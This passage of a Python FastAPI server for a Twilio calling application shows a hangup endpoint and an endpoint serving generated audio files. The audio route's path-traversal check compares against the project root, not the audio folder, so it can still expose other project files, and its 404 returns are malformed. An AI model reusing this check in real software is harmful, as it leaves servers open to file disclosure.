        logger.error(f"[TW_STATUS_FORWARD] Unexpected error while forwarding status for {call_sid}: {e}")

    return {'ok': True}


@app.post('/hangup')
async def hangup(request: Request):
    """Terminate a running call by CallSid or call_id.

    JSON body: {"call_sid": "ACxxx"}
   """
    body = await request.json()
    call_sid = body.get('call_sid')
    if not call_sid:
        raise HTTPException(status_code=400, detail='call_sid required')
    try:
        twilio_client.calls(call_sid).update(status='completed')
        await manager.set_state(call_sid, 'completed')
        return {'ok': True}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get('/audio/{call_sid}/{filename}')
async def get_audio_file(call_sid: str, filename: str):
    """Serve generated AI audio files via HTTP.
    
    Path: /audio/{call_sid}/{filename}
    Returns: MP3 audio file or 404
    """
    base_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), os.pardir))
    filepath = os.path.join(base_dir, "audio", call_sid, filename)
    resolved_path = os.path.abspath(filepath)
    safe_root = os.path.abspath(os.path.join(os.path.dirname(__file__), os.pardir))
    if not resolved_path.startswith(safe_root):
        logger.warning(
            "[AUDIO_READ_INVALID] attempted path traversal call_sid=%s filename=%s resolved_path=%s",
            call_sid,
            filename,
            resolved_path,
        )
        return {"error": "Not found"}, 404
    exists = os.path.isfile(resolved_path)
    logger.info(
        "[AUDIO_READ] requested_call_sid=%s requested_filename=%s cwd=%s resolved_abs_path=%s exists=%s",
        call_sid,
        filename,
        os.getcwd(),
        resolved_path,
        exists,
    )
    if exists:
        from fastapi.responses import FileResponse
        return FileResponse(resolved_path, media_type="audio/mpeg")
    else:
        directory = os.path.dirname(resolved_path)
        try:
            contents = sorted(os.listdir(directory)) if os.path.isdir(directory) else []
        except Exception as list_exc:
            contents = [f"<list_error: {list_exc}>"]
        logger.warning(
            "[AUDIO_READ_MISSING] requested_call_sid=%s requested_filename=%s checked_path=%s directory=%s contents=%s",
            call_sid,
            filename,
            resolved_path,
            directory,
            contents,
        )
        return {"error": "Not found"}, 404

# Mount Flask app after defining all native FastAPI routes.
# This ensures WebSocket routes like /twilio/media are matched by FastAPI first.
logger.warning("[SERVER_INIT] About to mount Flask app...")
mount_flask_app()
logger.warning("[SERVER_INIT] Flask app mount complete. FastAPI app ready to start.")
